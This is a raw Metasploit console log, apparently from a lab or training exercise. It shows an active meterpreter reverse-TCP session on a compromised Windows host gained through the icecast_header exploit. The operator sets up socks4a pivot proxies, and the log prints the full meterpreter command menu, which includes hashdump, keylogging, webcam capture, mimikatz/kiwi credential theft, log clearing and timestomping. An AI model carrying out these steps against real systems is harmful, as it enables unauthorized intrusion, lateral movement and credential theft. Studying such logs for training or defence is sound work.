+  Id  Name  Type                     Information             Connection
+  --  ----  ----                     -----------             ----------
+  1         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC  10.2.26.235:4444 -> 10.10.43.32:49229 (10.10.43.32)
+
+[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> see[Kssions -i 1
+[0m[1m[34m[*][0m Starting interaction with 1...
+
+[4mmeterpreter[0m > run auxiliary/server/socks4a
+[0m[4mmeterpreter[0m > 
+[1m[34m[*][0m Starting the socks4a proxy server
+Interrupt: use the 'exit' command to quit
+[4mmeterpreter[0m > clear
+[0m[1m[31m[-][0m Unknown command: clear.
+[4mmeterpreter[0m > background
+[0m[1m[34m[*][0m Backgrounding session 1...
+[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> use post/windows/manage/autoroute
+[0m[1m[31m[-][0m No results from search
+[1m[31m[-][0m Failed to load module: post/windows/manage/autoroute
+[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> se auxiliary/server/socks4a
+[0m[1m[31m[-][0m Unknown command: se.
+[4mmsf5[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> se auxiliary/server/socks4ause auxiliary/server/socks4a
+[0m[1m[34m[*][0m Using configured payload windows/meterpreter/reverse_tcp
+[4mmsf5[0m auxiliary([1m[31mserver/socks4a[0m) [0m> show options
+[0m
+Module options (auxiliary/server/socks4a):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The address to listen on
+   SRVPORT  1080             yes       The port to listen on.
+
+
+Auxiliary action:
+
+   Name   Description
+   ----   -----------
+   Proxy  Run SOCKS4a proxy
+
+
+[4mmsf5[0m auxiliary([1m[31mserver/socks4a[0m) [0m> set SRVPORT 8080
+[0mSRVPORT => 8080
+[4mmsf5[0m auxiliary([1m[31mserver/socks4a[0m) [0m> run
+[0m[1m[34m[*][0m Auxiliary module running as background job 2.
+[4mmsf5[0m auxiliary([1m[31mserver/socks4a[0m) [0m> 
+[1m[34m[*][0m Starting the socks4a proxy server
+Interrupt: use the 'exit' command to quit
+[4mmsf5[0m auxiliary([1m[31mserver/socks4a[0m) [0m> sessions[K[K[K[K[K[K[K[Kjobs
+[0m
+Jobs
+====
+
+  Id  Name                       Payload  Payload opts
+  --  ----                       -------  ------------
+  1   Auxiliary: server/socks4a           
+  2   Auxiliary: server/socks4a           
+
+[4mmsf5[0m auxiliary([1m[31mserver/socks4a[0m) [0m> kills 2[K1
+[0m[1m[31m[-][0m Unknown command: kills.
+[4mmsf5[0m auxiliary([1m[31mserver/socks4a[0m) [0m> kills 1[P 1
+[0m[1m[34m[*][0m Stopping the following job(s): 1
+[1m[34m[*][0m Stopping job 1
+
+[1m[34m[*][0m Stopping the socks4a proxy server
+[4mmsf5[0m auxiliary([1m[31mserver/socks4a[0m) [0m> kill 2
+[0m[1m[34m[*][0m Stopping the following job(s): 2
+[1m[34m[*][0m Stopping job 2
+
+[1m[34m[*][0m Stopping the socks4a proxy server
+[4mmsf5[0m auxiliary([1m[31mserver/socks4a[0m) [0m> jobs
+[0m
+Jobs
+====
+
+No active jobs.
+
+[4mmsf5[0m auxiliary([1m[31mserver/socks4a[0m) [0m> sessions
+[0m
+Active sessions
+===============
+
+  Id  Name  Type                     Information             Connection
+  --  ----  ----                     -----------             ----------
+  1         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC  10.2.26.235:4444 -> 10.10.43.32:49229 (10.10.43.32)
+
+[4mmsf5[0m auxiliary([1m[31mserver/socks4a[0m) [0m> close 1
+[0m[1m[31m[-][0m Unknown command: close.
+[4mmsf5[0m auxiliary([1m[31mserver/socks4a[0m) [0m> help
+[0m
+Core Commands
+=============
+
+    Command       Description
+    -------       -----------
+    ?             Help menu
+    banner        Display an awesome metasploit banner
+    cd            Change the current working directory
+    color         Toggle color
+    connect       Communicate with a host
+    exit          Exit the console
+    get           Gets the value of a context-specific variable
+    getg          Gets the value of a global variable
+    grep          Grep the output of another command
+    help          Help menu
+    history       Show command history
+    load          Load a framework plugin
+    quit          Exit the console
+    repeat        Repeat a list of commands
+    route         Route traffic through a session
+    save          Saves the active datastores
+    sessions      Dump session listings and display information about sessions
+    set           Sets a context-specific variable to a value
+    setg          Sets a global variable to a value
+    sleep         Do nothing for the specified number of seconds
+    spool         Write console output into a file as well the screen
+    threads       View and manipulate background threads
+    tips          Show a list of useful productivity tips
+    unload        Unload a framework plugin
+    unset         Unsets one or more context-specific variables
+    unsetg        Unsets one or more global variables
+    version       Show the framework and console library version numbers
+
+
+Module Commands
+===============
+
+    Command       Description
+    -------       -----------
+    advanced      Displays advanced options for one or more modules
+    back          Move back from the current context
+    clearm        Clear the module stack
+    info          Displays information about one or more modules
+    listm         List the module stack
+    loadpath      Searches for and loads modules from a path
+    options       Displays global options or for one or more modules
+    popm          Pops the latest module off the stack and makes it active
+    previous      Sets the previously loaded module as the current module
+    pushm         Pushes the active or list of modules onto the module stack
+    reload_all    Reloads all modules from all defined module paths
+    search        Searches module names and descriptions
+    show          Displays modules of a given type, or all modules
+    use           Interact with a module by name or search term/index
+
+
+Job Commands
+============
+
+    Command       Description
+    -------       -----------
+    handler       Start a payload handler as job
+    jobs          Displays and manages jobs
+    kill          Kill a job
+    rename_job    Rename a job
+
+
+Resource Script Commands
+========================
+
+    Command       Description
+    -------       -----------
+    makerc        Save commands entered since start to a file
+    resource      Run the commands stored in a file
+
+
+Database Backend Commands
+=========================
+
+    Command           Description
+    -------           -----------
+    analyze           Analyze database information about a specific address or address range
+    db_connect        Connect to an existing data service
+    db_disconnect     Disconnect from the current data service
+    db_export         Export a file containing the contents of the database
+    db_import         Import a scan result file (filetype will be auto-detected)
+    db_nmap           Executes nmap and records the output automatically
+    db_rebuild_cache  Rebuilds the database-stored module cache (deprecated)
+    db_remove         Remove the saved data service entry
+    db_save           Save the current data service connection as the default to reconnect on startup
+    db_status         Show the current data service status
+    hosts             List all hosts in the database
+    loot              List all loot in the database
+    notes             List all notes in the database
+    services          List all services in the database
+    vulns             List all vulnerabilities in the database
+    workspace         Switch between database workspaces
+
+
+Credentials Backend Commands
+============================
+
+    Command       Description
+    -------       -----------
+    creds         List all credentials in the database
+
+
+Developer Commands
+==================
+
+    Command       Description
+    -------       -----------
+    edit          Edit the current module or a file with the preferred editor
+    irb           Open an interactive Ruby shell in the current context
+    log           Display framework.log paged to the end if possible
+    pry           Open the Pry debugger on the current module or Framework
+    reload_lib    Reload Ruby library files from specified paths
+
+
+Auxiliary Commands
+==================
+
+    Command       Description
+    -------       -----------
+    check         Check to see if a target is vulnerable
+    exploit       This is an alias for the run command
+    rcheck        Reloads the module and checks if the target is vulnerable
+    recheck       This is an alias for the rcheck command
+    reload        Reloads the auxiliary module
+    rerun         Reloads and launches the auxiliary module
+    rexploit      This is an alias for the rerun command
+    run           Launches the auxiliary module
+
+
+msfconsole
+==========
+
+`msfconsole` is the primary interface to Metasploit Framework. There is quite a
+lot that needs go here, please be patient and keep an eye on this space!
+
+Building ranges and lists
+-------------------------
+
+Many commands and options that take a list of things can use ranges to avoid
+having to manually list each desired thing. All ranges are inclusive.
+
+### Ranges of IDs
+
+Commands that take a list of IDs can use ranges to help. Individual IDs must be
+separated by a `,` (no space allowed) and ranges can be expressed with either
+`-` or `..`.
+
+### Ranges of IPs
+
+There are several ways to specify ranges of IP addresses that can be mixed
+together. The first way is a list of IPs separated by just a ` ` (ASCII space),
+with an optional `,`. The next way is two complete IP addresses in the form of
+`BEGINNING_ADDRESS-END_ADDRESS` like `127.0.1.44-127.0.2.33`. CIDR
+specifications may also be used, however the whole address must be given to
+Metasploit like `127.0.0.0/8` and not `127/8`, contrary to the RFC.
+Additionally, a netmask can be used in conjunction with a domain name to
+dynamically resolve which block to target. All these methods work for both IPv4
+and IPv6 addresses. IPv4 addresses can also be specified with special octet
+ranges from the [NMAP target
+specification](https://nmap.org/book/man-target-specification.html)
+
+### Examples
+
+Terminate the first sessions:
+
+    sessions -k 1
+
+Stop some extra running jobs:
+
+    jobs -k 2-6,7,8,11..15
+
+Check a set of IP addresses:
+
+    check 127.168.0.0/16, 127.0.0-2.1-4,15 127.0.0.255
+
+Target a set of IPv6 hosts:
+
+    set RHOSTS fe80::3990:0000/110, ::1-::f0f0
+
+Target a block from a resolved domain name:
+
+    set RHOSTS www.example.test/24
+[4mmsf5[0m auxiliary([1m[31mserver/socks4a[0m) [0m> sessions -1 [K[Ki1[K 1
+[0m[1m[34m[*][0m Starting interaction with 1...
+
+[4mmeterpreter[0m > help
+[0m
+Core Commands
+=============
+
+    Command                   Description
+    -------                   -----------
+    ?                         Help menu
+    background                Backgrounds the current session
+    bg                        Alias for background
+    bgkill                    Kills a background meterpreter script
+    bglist                    Lists running background scripts
+    bgrun                     Executes a meterpreter script as a background thread
+    channel                   Displays information or control active channels
+    close                     Closes a channel
+    disable_unicode_encoding  Disables encoding of unicode strings
+    enable_unicode_encoding   Enables encoding of unicode strings
+    exit                      Terminate the meterpreter session
+    get_timeouts              Get the current session timeout values
+    guid                      Get the session GUID
+    help                      Help menu
+    info                      Displays information about a Post module
+    irb                       Open an interactive Ruby shell on the current session
+    load                      Load one or more meterpreter extensions
+    machine_id                Get the MSF ID of the machine attached to the session
+    migrate                   Migrate the server to another process
+    pivot                     Manage pivot listeners
+    pry                       Open the Pry debugger on the current session
+    quit                      Terminate the meterpreter session
+    read                      Reads data from a channel
+    resource                  Run the commands stored in a file
+    run                       Executes a meterpreter script or Post module
+    secure                    (Re)Negotiate TLV packet encryption on the session
+    sessions                  Quickly switch to another session
+    set_timeouts              Set the current session timeout values
+    sleep                     Force Meterpreter to go quiet, then re-establish session.
+    transport                 Change the current transport mechanism
+    use                       Deprecated alias for "load"
+    uuid                      Get the UUID for the current session
+    write                     Writes data to a channel
+
+
+Stdapi: File system Commands
+============================
+
+    Command       Description
+    -------       -----------
+    cat           Read the contents of a file to the screen
+    cd            Change directory
+    checksum      Retrieve the checksum of a file
+    cp            Copy source to destination
+    dir           List files (alias for ls)
+    download      Download a file or directory
+    edit          Edit a file
+    getlwd        Print local working directory
+    getwd         Print working directory
+    lcd           Change local working directory
+    lls           List local files
+    lpwd          Print local working directory
+    ls            List files
+    mkdir         Make directory
+    mv            Move source to destination
+    pwd           Print working directory
+    rm            Delete the specified file
+    rmdir         Remove directory
+    search        Search for files
+    show_mount    List all mount points/logical drives
+    upload        Upload a file or directory
+
+
+Stdapi: Networking Commands
+===========================
+
+    Command       Description
+    -------       -----------
+    arp           Display the host ARP cache
+    getproxy      Display the current proxy configuration
+    ifconfig      Display interfaces
+    ipconfig      Display interfaces
+    netstat       Display the network connections
+    portfwd       Forward a local port to a remote service
+    resolve       Resolve a set of host names on the target
+    route         View and modify the routing table
+
+
+Stdapi: System Commands
+=======================
+
+    Command       Description
+    -------       -----------
+    clearev       Clear the event log
+    drop_token    Relinquishes any active impersonation token.
+    execute       Execute a command
+    getenv        Get one or more environment variable values
+    getpid        Get the current process identifier
+    getprivs      Attempt to enable all privileges available to the current process
+    getsid        Get the SID of the user that the server is running as
+    getuid        Get the user that the server is running as
+    kill          Terminate a process
+    localtime     Displays the target system's local date and time
+    pgrep         Filter processes by name
+    pkill         Terminate processes by name
+    ps            List running processes
+    reboot        Reboots the remote computer
+    reg           Modify and interact with the remote registry
+    rev2self      Calls RevertToSelf() on the remote machine
+    shell         Drop into a system command shell
+    shutdown      Shuts down the remote computer
+    steal_token   Attempts to steal an impersonation token from the target process
+    suspend       Suspends or resumes a list of processes
+    sysinfo       Gets information about the remote system, such as OS
+
+
+Stdapi: User interface Commands
+===============================
+
+    Command        Description
+    -------        -----------
+    enumdesktops   List all accessible desktops and window stations
+    getdesktop     Get the current meterpreter desktop
+    idletime       Returns the number of seconds the remote user has been idle
+    keyboard_send  Send keystrokes
+    keyevent       Send key events
+    keyscan_dump   Dump the keystroke buffer
+    keyscan_start  Start capturing keystrokes
+    keyscan_stop   Stop capturing keystrokes
+    mouse          Send mouse events
+    screenshare    Watch the remote user's desktop in real time
+    screenshot     Grab a screenshot of the interactive desktop
+    setdesktop     Change the meterpreters current desktop
+    uictl          Control some of the user interface components
+
+
+Stdapi: Webcam Commands
+=======================
+
+    Command        Description
+    -------        -----------
+    record_mic     Record audio from the default microphone for X seconds
+    webcam_chat    Start a video chat
+    webcam_list    List webcams
+    webcam_snap    Take a snapshot from the specified webcam
+    webcam_stream  Play a video stream from the specified webcam
+
+
+Stdapi: Audio Output Commands
+=============================
+
+    Command       Description
+    -------       -----------
+    play          play a waveform audio file (.wav) on the target system
+
+
+Priv: Elevate Commands
+======================
+
+    Command       Description
+    -------       -----------
+    getsystem     Attempt to elevate your privilege to that of local system.
+
+
+Priv: Password database Commands
+================================
+
+    Command       Description
+    -------       -----------
+    hashdump      Dumps the contents of the SAM database
+
+
+Priv: Timestomp Commands
+========================
+
+    Command       Description
+    -------       -----------
+    timestomp     Manipulate file MACE attributes
+
+
+Mimikatz Commands
+=================
+
+    Command           Description
+    -------           -----------
+    kerberos          Attempt to retrieve kerberos creds.
+    livessp           Attempt to retrieve livessp creds.
+    mimikatz_command  Run a custom command.
+    msv               Attempt to retrieve msv creds (hashes).
+    ssp               Attempt to retrieve ssp creds.
+    tspkg             Attempt to retrieve tspkg creds.
+    wdigest           Attempt to retrieve wdigest creds.
+
+
+Kiwi Commands
+=============
+
+    Command                Description
+    -------                -----------
+    creds_all              Retrieve all credentials (parsed)
+    creds_kerberos         Retrieve Kerberos creds (parsed)
+    creds_msv              Retrieve LM/NTLM creds (parsed)
+    creds_ssp              Retrieve SSP creds
+    creds_tspkg            Retrieve TsPkg creds (parsed)
+    creds_wdigest          Retrieve WDigest creds (parsed)
+    dcsync                 Retrieve user account information via DCSync (unparsed)
+    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
+    golden_ticket_create   Create a golden kerberos ticket
+    kerberos_ticket_list   List all kerberos tickets (unparsed)
+    kerberos_ticket_purge  Purge any in-use kerberos tickets
+    kerberos_ticket_use    Use a kerberos ticket
+    kiwi_cmd               Execute an arbitary mimikatz command (unparsed)
+    lsa_dump_sam           Dump LSA SAM (unparsed)
+    lsa_dump_secrets       Dump LSA secrets (unparsed)
+    password_change        Change the password/hash of a user
+    wifi_list              List wifi profiles/creds for the current user
+    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)
+
+[4mmeterpreter[0m > close
+[0mUsage: close <channel_id>
+
+Closes the supplied channel.
+
+[4mmeterpreter[0m > quit
+[0m[1m[34m[*][0m Shutting down Meterpreter...
+
+[1m[34m[*][0m 10.10.43.32 - Meterpreter session 1 closed.  Reason: User exit
+[4mmsf5[0m auxiliary([1m[31mserver/socks4a[0m) [0m> show options 
+[0m
+Module options (auxiliary/server/socks4a):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The address to listen on
+   SRVPORT  8080             yes       The port to listen on.
+
+
+Auxiliary action:
+
+   Name   Description
+   ----   -----------
+   Proxy  Run SOCKS4a proxy
+
+
+[4mmsf5[0m auxiliary([1m[31mserver/socks4a[0m) [0m> exit
+[0m
